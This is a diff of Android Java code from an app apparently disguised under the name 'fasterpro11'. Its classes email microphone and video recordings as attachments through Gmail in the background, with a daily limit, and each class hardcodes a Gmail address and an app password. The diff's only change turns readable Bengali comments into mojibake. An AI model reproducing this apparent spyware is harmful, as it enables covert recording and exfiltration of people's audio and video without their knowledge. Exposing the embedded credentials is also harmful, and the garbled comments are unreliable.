-                // মেইল পাঠানো
+                // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                 try {
-                    Transport.send(mimeMessage); // মেইল পাঠানো
-                    CountEmail.incrementEmailCount(); // ইমেল সফলভাবে পাঠানোর পর কাউন্টার বাড়ান
-                    Log.d(TAG, "MicRecord Email sent successfully with attachment."); // সফল লগ
+                    Transport.send(mimeMessage); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
+                    CountEmail.incrementEmailCount(); // à¦‡à¦®à§‡à¦² à¦¸à¦«à¦²à¦­à¦¾à¦¬à§‡ à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦ªà¦° à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦¾à¦° à¦¬à¦¾à§œà¦¾à¦¨
+                    Log.d(TAG, "MicRecord Email sent successfully with attachment."); // à¦¸à¦«à¦² à¦²à¦—
                 } catch (MessagingException e) {
-                    Log.e(TAG, "Error occurred while sending email: " + e.getMessage()); // মেইল পাঠানোর ত্রুটি লগ
+                    Log.e(TAG, "Error occurred while sending email: " + e.getMessage()); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
                     e.printStackTrace();
                 }
             } catch (Exception e) {
-                Log.e(TAG, "Unexpected error occurred: " + e.getMessage()); // যেকোনো অপরিকল্পিত ত্রুটি
+                Log.e(TAG, "Unexpected error occurred: " + e.getMessage()); // à¦¯à§‡à¦•à§‹à¦¨à§‹ à¦…à¦ªà¦°à¦¿à¦•à¦²à§à¦ªà¦¿à¦¤ à¦¤à§à¦°à§à¦Ÿà¦¿
                 e.printStackTrace();
             }
-            return null; // সম্পন্ন
+            return null; // à¦¸à¦®à§à¦ªà¦¨à§à¦¨
         }
     }
 
-    // স্ট্যাটিক মেথড যা অন্য জায়গা থেকে ব্যবহার করা যাবে
+    // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡ à¦¯à¦¾ à¦…à¦¨à§à¦¯ à¦œà¦¾à§Ÿà¦—à¦¾ à¦¥à§‡à¦•à§‡ à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à¦¾ à¦¯à¦¾à¦¬à§‡
     public static void sendMailWithAttachment(String email, String subject, String message, String filePath) {
         try {
             JavaMailAPI_MicRecord_Sender javaMailAPI = new JavaMailAPI_MicRecord_Sender(email, subject, message, filePath);
-            javaMailAPI.sendMail(); // মেইল পাঠানোর মেথড কল করা
+            javaMailAPI.sendMail(); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡ à¦•à¦² à¦•à¦°à¦¾
         } catch (Exception e) {
-            Log.e(TAG, "Error occurred in sendMailWithAttachment: " + e.getMessage()); // স্ট্যাটিক মেথডে ত্রুটি লগ
+            Log.e(TAG, "Error occurred in sendMailWithAttachment: " + e.getMessage()); // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡à§‡ à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
             e.printStackTrace();
         }
     }
@@ -7814,114 +7880,114 @@ public class JavaMailAPI_MicRecord_Sender {
 //JavaMailAPI_MicRecord_Sender .java
 package com.example.fasterpro11;
 
-import android.os.AsyncTask; // AsyncTask ব্যবহার
-import android.util.Log; // লগ ব্যবহারের জন্য
+import android.os.AsyncTask; // AsyncTask à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°
+import android.util.Log; // à¦²à¦— à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
 
-import java.io.File; // ফাইল ব্যবহারের জন্য
-import java.util.Properties; // প্রপার্টি সেটিংস
-import javax.mail.*; // মেইল ব্যবহারের জন্য
-import javax.mail.internet.*; // ইন্টারনেট মেইল
-import javax.activation.*; // অ্যাকটিভেশন
+import java.io.File; // à¦«à¦¾à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
+import java.util.Properties; // à¦ªà§à¦°à¦ªà¦¾à¦°à§à¦Ÿà¦¿ à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
+import javax.mail.*; // à¦®à§‡à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
+import javax.mail.internet.*; // à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦¨à§‡à¦Ÿ à¦®à§‡à¦‡à¦²
+import javax.activation.*; // à¦…à§à¦¯à¦¾à¦•à¦Ÿà¦¿à¦­à§‡à¦¶à¦¨
 
 public class JavaMailAPI_MicRecord_Sender {
-    private static final String TAG = "JavaMailAPI"; // লগ ট্যাগ
-    private String email; // প্রাপক ইমেইল
-    private String subject; // ইমেইল সাবজেক্ট
-    private String message; // ইমেইল মেসেজ
-    private String filePath; // ফাইলের পাথ
+    private static final String TAG = "JavaMailAPI"; // à¦²à¦— à¦Ÿà§à¦¯à¦¾à¦—
+    private String email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦²
+    private String subject; // à¦‡à¦®à§‡à¦‡à¦² à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ
+    private String message; // à¦‡à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ
+    private String filePath; // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦ªà¦¾à¦¥
 
-    // কনস্ট্রাক্টর
+    // à¦•à¦¨à¦¸à§à¦Ÿà§à¦°à¦¾à¦•à§à¦Ÿà¦°
     public JavaMailAPI_MicRecord_Sender(String email, String subject, String message, String filePath) {
-        this.email = email; // প্রাপক ইমেইল সেট করা
-        this.subject = subject; // সাবজেক্ট সেট করা
-        this.message = message; // মেসেজ সেট করা
-        this.filePath = filePath; // ফাইল পাথ সেট করা
+        this.email = email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦² à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        this.subject = subject; // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        this.message = message; // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        this.filePath = filePath; // à¦«à¦¾à¦‡à¦² à¦ªà¦¾à¦¥ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
     }
 
-    // মেইল পাঠানোর মেথড
+    // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡
     public void sendMail() {
-        new SendMailTask().execute(); // AsyncTask শুরু
+        new SendMailTask().execute(); // AsyncTask à¦¶à§à¦°à§
     }
 
     private class SendMailTask extends AsyncTask<Void, Void, Void> {
         @Override
         protected Void doInBackground(Void... voids) {
             try {
-                // ইমেল পাঠানোর অনুমতি চেক করুন
+                // à¦‡à¦®à§‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦…à¦¨à§à¦®à¦¤à¦¿ à¦šà§‡à¦• à¦•à¦°à§à¦¨
                 if (!CountEmail.canSendEmail()) {
-                    Log.d(TAG, "Email limit reached for today. No email sent."); // সীমা পৌঁছালে লগ
-                    return null; // মেইল পাঠানো হবে না
+                    Log.d(TAG, "Email limit reached for today. No email sent."); // à¦¸à§€à¦®à¦¾ à¦ªà§Œà¦à¦›à¦¾à¦²à§‡ à¦²à¦—
+                    return null; // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦¹à¦¬à§‡ à¦¨à¦¾
                 }
 
-                // SMTP সেটিংস
+                // SMTP à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
                 Properties props = new Properties();
-                props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP সার্ভার
-                props.put("mail.smtp.port", "587"); // SMTP পোর্ট
-                props.put("mail.smtp.auth", "true"); // অথেনটিকেশন
-                props.put("mail.smtp.starttls.enable", "true"); // TLS সক্রিয় করা
+                props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP à¦¸à¦¾à¦°à§à¦­à¦¾à¦°
+                props.put("mail.smtp.port", "587"); // SMTP à¦ªà§‹à¦°à§à¦Ÿ
+                props.put("mail.smtp.auth", "true"); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
+                props.put("mail.smtp.starttls.enable", "true"); // TLS à¦¸à¦•à§à¦°à¦¿à§Ÿ à¦•à¦°à¦¾
 
-                final String username = "abontiangum99@gmail.com"; // আপনার Gmail ঠিকানা
-                final String password = "egqnjvccoqtgwaxo"; // আপনার Gmail পাসওয়ার্ড
+                final String username = "abontiangum99@gmail.com"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ à¦¿à¦•à¦¾à¦¨à¦¾
+                final String password = "egqnjvccoqtgwaxo"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡
 
-                // সেশন তৈরি করা
+                // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                 Session session = Session.getInstance(props, new javax.mail.Authenticator() {
                     protected PasswordAuthentication getPasswordAuthentication() {
-                        return new PasswordAuthentication(username, password); // অথেনটিকেশন
+                        return new PasswordAuthentication(username, password); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
                     }
                 });
 
-                // মেইল মেসেজ তৈরি করা
+                // à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                 MimeMessage mimeMessage = new MimeMessage(session);
-                mimeMessage.setFrom(new InternetAddress(username)); // প্রেরক সেট করা
-                mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(email)); // প্রাপক সেট করা
-                mimeMessage.setSubject(subject); // সাবজেক্ট সেট করা
+                mimeMessage.setFrom(new InternetAddress(username)); // à¦ªà§à¦°à§‡à¦°à¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+                mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(email)); // à¦ªà§à¦°à¦¾à¦ªà¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+                mimeMessage.setSubject(subject); // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
 
-                // মেসেজ এবং অ্যাটাচমেন্ট যুক্ত করা
+                // à¦®à§‡à¦¸à§‡à¦œ à¦à¦¬à¦‚ à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                 Multipart multipart = new MimeMultipart();
                 MimeBodyPart messageBodyPart = new MimeBodyPart();
-                messageBodyPart.setText(message); // মেসেজ সেট করা
-                multipart.addBodyPart(messageBodyPart); // মেসেজ যুক্ত করা
+                messageBodyPart.setText(message); // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+                multipart.addBodyPart(messageBodyPart); // à¦®à§‡à¦¸à§‡à¦œ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
 
-                // ফাইল অ্যাটাচমেন্ট যুক্ত করা (যদি থাকে)
+                // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾ (à¦¯à¦¦à¦¿ à¦¥à¦¾à¦•à§‡)
                 if (filePath != null && !filePath.isEmpty()) {
                     try {
                         MimeBodyPart attachmentPart = new MimeBodyPart();
-                        DataSource source = new FileDataSource(filePath); // ফাইল সোর্স
-                        attachmentPart.setDataHandler(new DataHandler(source)); // ডেটা হ্যান্ডলার
-                        attachmentPart.setFileName(new File(filePath).getName()); // ফাইলের নাম
-                        multipart.addBodyPart(attachmentPart); // অ্যাটাচমেন্ট যুক্ত করা
+                        DataSource source = new FileDataSource(filePath); // à¦«à¦¾à¦‡à¦² à¦¸à§‹à¦°à§à¦¸
+                        attachmentPart.setDataHandler(new DataHandler(source)); // à¦¡à§‡à¦Ÿà¦¾ à¦¹à§à¦¯à¦¾à¦¨à§à¦¡à¦²à¦¾à¦°
+                        attachmentPart.setFileName(new File(filePath).getName()); // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦¨à¦¾à¦®
+                        multipart.addBodyPart(attachmentPart); // à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                     } catch (Exception e) {
-                        Log.e(TAG, "Error occurred while attaching file: " + e.getMessage()); // ফাইল অ্যাটাচমেন্ট ত্রুটি লগ
+                        Log.e(TAG, "Error occurred while attaching file: " + e.getMessage()); // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
                         e.printStackTrace();
                     }
                 }
 
-                mimeMessage.setContent(multipart); // মেইল কনটেন্ট সেট করা
+                mimeMessage.setContent(multipart); // à¦®à§‡à¦‡à¦² à¦•à¦¨à¦Ÿà§‡à¦¨à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
 
-                // মেইল পাঠানো
+                // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                 try {
-                    Transport.send(mimeMessage); // মেইল পাঠানো
-                    CountEmail.incrementEmailCount(); // ইমেল সফলভাবে পাঠানোর পর কাউন্টার বাড়ান
-                    Log.d(TAG, "MicRecord Email sent successfully with attachment."); // সফল লগ
+                    Transport.send(mimeMessage); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
+                    CountEmail.incrementEmailCount(); // à¦‡à¦®à§‡à¦² à¦¸à¦«à¦²à¦­à¦¾à¦¬à§‡ à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦ªà¦° à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦¾à¦° à¦¬à¦¾à§œà¦¾à¦¨
+                    Log.d(TAG, "MicRecord Email sent successfully with attachment."); // à¦¸à¦«à¦² à¦²à¦—
                 } catch (MessagingException e) {
-                    Log.e(TAG, "Error occurred while sending email: " + e.getMessage()); // মেইল পাঠানোর ত্রুটি লগ
+                    Log.e(TAG, "Error occurred while sending email: " + e.getMessage()); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
                     e.printStackTrace();
                 }
             } catch (Exception e) {
-                Log.e(TAG, "Unexpected error occurred: " + e.getMessage()); // যেকোনো অপরিকল্পিত ত্রুটি
+                Log.e(TAG, "Unexpected error occurred: " + e.getMessage()); // à¦¯à§‡à¦•à§‹à¦¨à§‹ à¦…à¦ªà¦°à¦¿à¦•à¦²à§à¦ªà¦¿à¦¤ à¦¤à§à¦°à§à¦Ÿà¦¿
                 e.printStackTrace();
             }
-            return null; // সম্পন্ন
+            return null; // à¦¸à¦®à§à¦ªà¦¨à§à¦¨
         }
     }
 
-    // স্ট্যাটিক মেথড যা অন্য জায়গা থেকে ব্যবহার করা যাবে
+    // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡ à¦¯à¦¾ à¦…à¦¨à§à¦¯ à¦œà¦¾à§Ÿà¦—à¦¾ à¦¥à§‡à¦•à§‡ à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à¦¾ à¦¯à¦¾à¦¬à§‡
     public static void sendMailWithAttachment(String email, String subject, String message, String filePath) {
         try {
             JavaMailAPI_MicRecord_Sender javaMailAPI = new JavaMailAPI_MicRecord_Sender(email, subject, message, filePath);
-            javaMailAPI.sendMail(); // মেইল পাঠানোর মেথড কল করা
+            javaMailAPI.sendMail(); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡ à¦•à¦² à¦•à¦°à¦¾
         } catch (Exception e) {
-            Log.e(TAG, "Error occurred in sendMailWithAttachment: " + e.getMessage()); // স্ট্যাটিক মেথডে ত্রুটি লগ
+            Log.e(TAG, "Error occurred in sendMailWithAttachment: " + e.getMessage()); // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡à§‡ à¦¤à§à¦°à§à¦Ÿà¦¿ à¦²à¦—
             e.printStackTrace();
         }
     }
@@ -7932,121 +7998,121 @@ public class JavaMailAPI_MicRecord_Sender {
 //JavaMailAPI_VideoRecord_Sender.java
 package com.example.fasterpro11;
 
-import android.os.AsyncTask; // AsyncTask ব্যবহার
-import android.util.Log; // লগ ব্যবহারের জন্য
+import android.os.AsyncTask; // AsyncTask à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°
+import android.util.Log; // à¦²à¦— à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
 
-import java.io.File; // ফাইল ব্যবহারের জন্য
-import java.util.Properties; // প্রপার্টি সেটিংস
-import javax.mail.*; // মেইল ব্যবহারের জন্য
-import javax.mail.internet.*; // ইন্টারনেট মেইল
-import javax.activation.*; // অ্যাকটিভেশন
+import java.io.File; // à¦«à¦¾à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
+import java.util.Properties; // à¦ªà§à¦°à¦ªà¦¾à¦°à§à¦Ÿà¦¿ à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
+import javax.mail.*; // à¦®à§‡à¦‡à¦² à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦°à§‡à¦° à¦œà¦¨à§à¦¯
+import javax.mail.internet.*; // à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦¨à§‡à¦Ÿ à¦®à§‡à¦‡à¦²
+import javax.activation.*; // à¦…à§à¦¯à¦¾à¦•à¦Ÿà¦¿à¦­à§‡à¦¶à¦¨
 
 public class JavaMailAPI_VideoRecord_Sender {
-    private static final String TAG = "JavaMailAPI"; // লগ ট্যাগ
-    private String email; // প্রাপক ইমেইল
-    private String subject; // ইমেইল সাবজেক্ট
-    private String message; // ইমেইল মেসেজ
-    private String filePath; // ফাইলের পাথ
+    private static final String TAG = "JavaMailAPI"; // à¦²à¦— à¦Ÿà§à¦¯à¦¾à¦—
+    private String email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦²
+    private String subject; // à¦‡à¦®à§‡à¦‡à¦² à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ
+    private String message; // à¦‡à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ
+    private String filePath; // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦ªà¦¾à¦¥
 
-    // কনস্ট্রাক্টর
+    // à¦•à¦¨à¦¸à§à¦Ÿà§à¦°à¦¾à¦•à§à¦Ÿà¦°
     public JavaMailAPI_VideoRecord_Sender(String email, String subject, String message, String filePath) {
-        this.email = email; // প্রাপক ইমেইল সেট করা
-        this.subject = subject; // সাবজেক্ট সেট করা
-        this.message = message; // মেসেজ সেট করা
-        this.filePath = filePath; // ফাইল পাথ সেট করা
+        this.email = email; // à¦ªà§à¦°à¦¾à¦ªà¦• à¦‡à¦®à§‡à¦‡à¦² à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        this.subject = subject; // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        this.message = message; // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        this.filePath = filePath; // à¦«à¦¾à¦‡à¦² à¦ªà¦¾à¦¥ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
     }
 
-    // মেইল পাঠানোর মেথড
+    // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡
     public void sendMail() {
-        new SendMailTask().execute(); // AsyncTask শুরু
+        new SendMailTask().execute(); // AsyncTask à¦¶à§à¦°à§
     }
 
     private class SendMailTask extends AsyncTask<Void, Void, Void> {
         @Override
         protected Void doInBackground(Void... voids) {
-            // ইমেল পাঠানোর অনুমতি চেক করুন
+            // à¦‡à¦®à§‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦…à¦¨à§à¦®à¦¤à¦¿ à¦šà§‡à¦• à¦•à¦°à§à¦¨
             if (!CountEmail.canSendEmail()) {
-                Log.d(TAG, "Email limit reached for today. No email sent."); // সীমা পৌঁছালে লগ
-                return null; // মেইল পাঠানো হবে না
+                Log.d(TAG, "Email limit reached for today. No email sent."); // à¦¸à§€à¦®à¦¾ à¦ªà§Œà¦à¦›à¦¾à¦²à§‡ à¦²à¦—
+                return null; // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦¹à¦¬à§‡ à¦¨à¦¾
             }
 
-            // SMTP সেটিংস
+            // SMTP à¦¸à§‡à¦Ÿà¦¿à¦‚à¦¸
             Properties props = new Properties();
-            props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP সার্ভার
-            props.put("mail.smtp.port", "587"); // SMTP পোর্ট
-            props.put("mail.smtp.auth", "true"); // অথেনটিকেশন
-            props.put("mail.smtp.starttls.enable", "true"); // TLS সক্রিয় করা
+            props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP à¦¸à¦¾à¦°à§à¦­à¦¾à¦°
+            props.put("mail.smtp.port", "587"); // SMTP à¦ªà§‹à¦°à§à¦Ÿ
+            props.put("mail.smtp.auth", "true"); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
+            props.put("mail.smtp.starttls.enable", "true"); // TLS à¦¸à¦•à§à¦°à¦¿à§Ÿ à¦•à¦°à¦¾
 
-            final String username = "abontiangum99@gmail.com"; // আপনার Gmail ঠিকানা
-            final String password = "egqnjvccoqtgwaxo"; // আপনার Gmail পাসওয়ার্ড
+            final String username = "abontiangum99@gmail.com"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ à¦¿à¦•à¦¾à¦¨à¦¾
+            final String password = "egqnjvccoqtgwaxo"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡
 
-            // সেশন তৈরি করা
+            // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
             Session session = null;
             try {
                 session = Session.getInstance(props, new javax.mail.Authenticator() {
                     protected PasswordAuthentication getPasswordAuthentication() {
-                        return new PasswordAuthentication(username, password); // অথেনটিকেশন
+                        return new PasswordAuthentication(username, password); // à¦…à¦¥à§‡à¦¨à¦Ÿà¦¿à¦•à§‡à¦¶à¦¨
                     }
                 });
             } catch (Exception e) {
-                Log.e(TAG, "Error occurred while creating session: " + e.getMessage(), e); // সেশন তৈরির ত্রুটি
+                Log.e(TAG, "Error occurred while creating session: " + e.getMessage(), e); // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿à¦° à¦¤à§à¦°à§à¦Ÿà¦¿
                 e.printStackTrace();
-                return null; // সেশন তৈরি ব্যর্থ হলে প্রক্রিয়া থামান
+                return null; // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿ à¦¬à§à¦¯à¦°à§à¦¥ à¦¹à¦²à§‡ à¦ªà§à¦°à¦•à§à¦°à¦¿à§Ÿà¦¾ à¦¥à¦¾à¦®à¦¾à¦¨
             }
 
             try {
-                // মেইল মেসেজ তৈরি করা
+                // à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
                 MimeMessage mimeMessage = new MimeMessage(session);
-                mimeMessage.setFrom(new InternetAddress(username)); // প্রেরক সেট করা
-                mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(email)); // প্রাপক সেট করা
-                mimeMessage.setSubject(subject); // সাবজেক্ট সেট করা
+                mimeMessage.setFrom(new InternetAddress(username)); // à¦ªà§à¦°à§‡à¦°à¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+                mimeMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(email)); // à¦ªà§à¦°à¦¾à¦ªà¦• à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+                mimeMessage.setSubject(subject); // à¦¸à¦¾à¦¬à¦œà§‡à¦•à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
 
-                // মেসেজ এবং অ্যাটাচমেন্ট যুক্ত করা
+                // à¦®à§‡à¦¸à§‡à¦œ à¦à¦¬à¦‚ à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                 Multipart multipart = new MimeMultipart();
                 MimeBodyPart messageBodyPart = new MimeBodyPart();
-                messageBodyPart.setText(message); // মেসেজ সেট করা
-                multipart.addBodyPart(messageBodyPart); // মেসেজ যুক্ত করা
+                messageBodyPart.setText(message); // à¦®à§‡à¦¸à§‡à¦œ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+                multipart.addBodyPart(messageBodyPart); // à¦®à§‡à¦¸à§‡à¦œ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
 
-                // ফাইল অ্যাটাচমেন্ট যুক্ত করা (যদি থাকে)
+                // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾ (à¦¯à¦¦à¦¿ à¦¥à¦¾à¦•à§‡)
                 if (filePath != null && !filePath.isEmpty()) {
                     try {
                         MimeBodyPart attachmentPart = new MimeBodyPart();
-                        DataSource source = new FileDataSource(filePath); // ফাইল সোর্স
-                        attachmentPart.setDataHandler(new DataHandler(source)); // ডেটা হ্যান্ডলার
-                        attachmentPart.setFileName(new File(filePath).getName()); // ফাইলের নাম
-                        multipart.addBodyPart(attachmentPart); // অ্যাটাচমেন্ট যুক্ত করা
+                        DataSource source = new FileDataSource(filePath); // à¦«à¦¾à¦‡à¦² à¦¸à§‹à¦°à§à¦¸
+                        attachmentPart.setDataHandler(new DataHandler(source)); // à¦¡à§‡à¦Ÿà¦¾ à¦¹à§à¦¯à¦¾à¦¨à§à¦¡à¦²à¦¾à¦°
+                        attachmentPart.setFileName(new File(filePath).getName()); // à¦«à¦¾à¦‡à¦²à§‡à¦° à¦¨à¦¾à¦®
+                        multipart.addBodyPart(attachmentPart); // à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾
                     } catch (Exception e) {
-                        Log.e(TAG, "Error occurred while attaching the file: " + e.getMessage(), e); // ফাইল অ্যাটাচমেন্ট ত্রুটি
+                        Log.e(TAG, "Error occurred while attaching the file: " + e.getMessage(), e); // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦šà¦®à§‡à¦¨à§à¦Ÿ à¦¤à§à¦°à§à¦Ÿà¦¿
                         e.printStackTrace();
-                        return null; // ফাইল অ্যাটাচ করতে সমস্যা হলে প্রক্রিয়া থামান
+                        return null; // à¦«à¦¾à¦‡à¦² à¦…à§à¦¯à¦¾à¦Ÿà¦¾à¦š à¦•à¦°à¦¤à§‡ à¦¸à¦®à¦¸à§à¦¯à¦¾ à¦¹à¦²à§‡ à¦ªà§à¦°à¦•à§à¦°à¦¿à§Ÿà¦¾ à¦¥à¦¾à¦®à¦¾à¦¨
                     }
                 }
 
-                mimeMessage.setContent(multipart); // মেইল কনটেন্ট সেট করা
+                mimeMessage.setContent(multipart); // à¦®à§‡à¦‡à¦² à¦•à¦¨à¦Ÿà§‡à¦¨à§à¦Ÿ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
 
                 try {
-                    // মেইল পাঠানো
+                    // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                     Transport.send(mimeMessage);
-                    CountEmail.incrementEmailCount(); // ইমেল সফলভাবে পাঠানোর পর কাউন্টার বাড়ান
-                    Log.d(TAG, "VideoRecord Email sent successfully with attachment."); // সফল লগ
+                    CountEmail.incrementEmailCount(); // à¦‡à¦®à§‡à¦² à¦¸à¦«à¦²à¦­à¦¾à¦¬à§‡ à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦ªà¦° à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦¾à¦° à¦¬à¦¾à§œà¦¾à¦¨
